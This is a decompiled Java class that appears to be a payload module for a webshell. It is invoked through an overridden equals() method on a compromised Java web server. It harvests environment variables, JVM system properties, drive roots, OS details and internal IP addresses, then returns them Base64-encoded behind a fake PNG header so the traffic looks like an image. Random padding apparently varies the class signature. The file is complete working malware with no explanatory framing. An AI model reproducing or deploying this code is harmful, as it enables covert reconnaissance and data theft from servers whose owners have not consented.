/*
 * Decompiled with CFR.
 */
package net.lkj.uqsp;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.lang.Class;
import java.lang.Exception;
import java.lang.Integer;
import java.lang.Object;
import java.lang.String;
import java.lang.StringBuilder;
import java.lang.System;
import java.lang.Throwable;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Base64;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.Set;

/*
 * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
 */
public class Zkol {
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public Zkol() {
        whatever = "";
        whatever = whatever + "pfZ5xNskxZTG6Ed9PtGBJhYqYlCZF0N9ACcAfNJmx4fmr7z7DIUFVYpwwF6WDLhM7JBQmM3D28bFMrHBKvcsw4t6QCcpeRfIxzuglCM6EgvFi8jVx6dRZZc4AB7MkDrbpmtiTjIZUUTAgxK589054ICsS1pY0jFtTf2lvEY8j8WeWhdZyRZk67mDSv4eFhHCERqUttBuv9l1YKKbYp5JoJjVyAb1spInykk7YRnHTV5n9gPGOYSpn7TKeOFtwNdU7IPxi5K86j6AfA6hxFsuY3r1pmWuEJqSea7rAOJDiMKgpheMx9jhA7nWfKrEDC35VyCf6yeO4UMXJP4ZWbxxi0Xptq4ZWMBJpDImvAV4iEbzk94mWHqENoerOAyXkxiS2KNpDkRdtTl1mYFJxablutHmWeAGCD6WAdlG0NFNdmllMQnlzj7Ng3Q4UXmzpSMat7T2RI521olp7KAYaLUtukh75Z7K1LF3vF50mNBo54fWK4XOIzhLCbbCDJFfh0R12aSlTz0KXzxbk7Q2Nx5tbgi1qEUHJdQG6vBTrhnlDDVDK9U29ejV9kG8wAXZs8vGYdcBDxM9F5PS9SdNmVMKTCAo3KxskR35i3sgbXleRKf3unhpibTQvF3NTCYR8hC637eantfoZmnFiylcUrFnmEhWmRr2X4iq3CIecH4HLOb2KdbIef84zlUJQdzhcsClY1KKO0Oudq0T1oElVm2mpXekP0OjnDEM9WlVbEsberuRhf1SfBHCxa0pcbEhgbiCQoRc8voAaLINlAUC5BjHscB4kyS0uNjMqPzI3VY2gSfrpM3zLbsjtafSFpDlcgMqWr26zb2TuJFvs1M1XOLC1aYys5m2CCNi8dKIwb22x4W6uk4m5vbHF3BIxbTeMH2OOww13xoFfOh7ASG09QeDiKlr4T43nHptQc6t0TT0ZzNhNOu0LAETN9uQjjGcw5nZE9TDcVtrKtCtSK6kNgqwkCGgnnWcMRNSSBiOwlwAQ15LGpD57iTYSkjLSg6lZSbpKVPAnxXEHbZAC1Ph1jm6fPu9XT4bssdeaGocckQGPG4TJgaERMJrGxc4GsviZh8zmQoZmstmosMUKkz1Z2QjHMN3bJmGdAnP5Vc6OTgxAgUmGYTsgky1tg5ad9YdyixIG3eLL89exvHeCs0pNDAzEtl1Yo5BPN9QxpBGulqAr5TSZFOaeekEIk5bR75UtGK8joaPj5xXQP5xUbKN45aBsRVOshN65TckA8jLVr6jls1s4YmXR7VIn4UaZSg9ON6kCH4KGxJFhltpPNXll3E72L7KqfCH54SUWMY2v5ur25JzEOUhdrFweEIG2hGy556ZCX6uiSHDhoF9KGInbY13mwdKtRzdJjyn3zaucWHdE9NYiwyVkg3ctzbrcU9k6cvgbXGuGPUxtuz8GP316AhWnxlJMvoLzYSN6x1a1tyabjHrjoaslgMFGAR895NxD89E66y3Jc8xoLP1xdci1eszNwZ9Y4ndSCFHDZW4oml2JZ6NXlwz6T3LPNuY274nVRyDLthSDRFTE5gJ6SMaU97OtaATlDwmMeOA85tjhMqMx4yrvIZ3S1gYNP7MNEe5KQcSW8uYvzBJcjZgJzuZAhYSYiqj8t9dXqqGYVCFMmi9rJBRbDgQjBqZVGU6EgJBmkLGSC5z4Ot30Fc3UzdcPONu9WRFbvpzpbiUxygd7dFfIuRtOhb9IIzPWkxHTucXehDqxY9vo65YPARjgHKlRMALkNKz3DgMoGKdNAThs3hnQyHNWDklyKP74PHgWThzi6TFdznVoYFnhv9WTBEaMTZZtY7VMIMFRpnUMTBFsNcqYwPLfqio82XAmOWxyveRkci5jAtV3heCikqfJkv3GFTFKU43Krq3SzmCMjg7FqgT57vj5htfJvfHxUG4ozemEaxSnvpKgh6suEezi98IuZq8bGTRRGO9uzR7ca2XtQOZ2kviu8bTDIpUxGzqNglG0L0rr0W4ABTwfEShMDq8yr";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean equals(Object obj) {
        HashMap<String, String> result = new HashMap<String, String>();
        try {
            File[] roots;
            this.fillContext(obj);
            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
            Map<String, String> env = System.getenv();
            for (String name : env.keySet()) {
                basicInfo.append(name + "=" + env.get(name) + "<br/>");
            }
            basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
            Properties props = System.getProperties();
            Set entrySet = props.entrySet();
            for (Map.Entry entry : entrySet) {
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
            }
            String currentPath = new File("").getAbsolutePath();
            String driveList = "";
            for (File f : roots = File.listRoots()) {
                driveList = driveList + f.getPath() + ";";
            }
            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
            HashMap<String, String> entity = new HashMap<String, String>();
            entity.put("basicInfo", basicInfo.toString());
            entity.put("currentPath", currentPath);
            entity.put("driveList", driveList);
            entity.put("osInfo", osInfo);
            entity.put("arch", System.getProperty("os.arch"));
            entity.put("localIp", this.getInnerIp());
            result.put("status", "success");
            result.put("msg", this.buildJson(entity, true));
        }
        catch (Exception so) {
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so2.getClass().getMethod("write", byte[].class);
                write.invoke(so2, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                return true;
            }
            catch (Exception exception) {
                return true;
            }
        }
        catch (Throwable throwable) {
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                throw throwable;
            }
            catch (Exception exception) {
                // empty catch block
            }
            throw throwable;
        }
        try {
            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
            Method write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            return true;
        }
        catch (Exception so) {
            return true;
        }
    }

    private String getInnerIp() {
        String ips = "";
        try {
            Enumeration<NetworkInterface> netInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip = null;
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = netInterfaces.nextElement();
                Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    ip = addresses.nextElement();
                    if (ip == null || !(ip instanceof Inet4Address)) continue;
                    ips = ips + ip.getHostAddress() + " ";
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        ips = ips.replace("127.0.0.1", "").trim();
        return ips;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAABSgAwAEAAAAAQAAAA4AAAAAa7cS3QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAAAXZJREFUOBGNVE1Lw0AQfRtNRfFUKyqp6E160bSlKv4SwZMeevHqH/EgxaOC/hVbMBoR/LhaP5DWXrxoajbu7LKyaZPUhYQJ897b2TezYZFYGLEiKAgDG4EErCwECYU8VBChSbEWT+OxtAqpcMaSK8rKjSftpAk84mg9X8Hv3kuYWyhhs1iVG2nMIH+oQg2k4x37Z9h/OkE5tyC8YfCCFzSWdlF3d2AxCxpriqYKXrQvseUdYHu6iiD6ARfuTbEczj9baNYOsVGsJArGmkKGa99uu4/Ij+Xl5l88wDfvg2Qdew5+504VlWBxTNAsXc+S4qiBoVgPkIk145gg0cgXWquFFfTCnjzqpGVjQjzk42v/He5sSWnoXdWXfCd2mTLrThlHnT3RlFO49rywArgO3tBYrqPmuIZEPBxqCqV192hsmm0PNx8PkrU2I8ZmsZLaYQIlClJCi1I8uLJyMQ9NInWbiH9XTyTl1cu4QcRPrdAU1/f3Pz+HX/qNrcYjTeaNAAAAAElFTkSuQmCC";
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(Base64.getDecoder().decode(string));
        byteArrayOutputStream.write(byArray);
        return byteArrayOutputStream.toByteArray();
    }
}
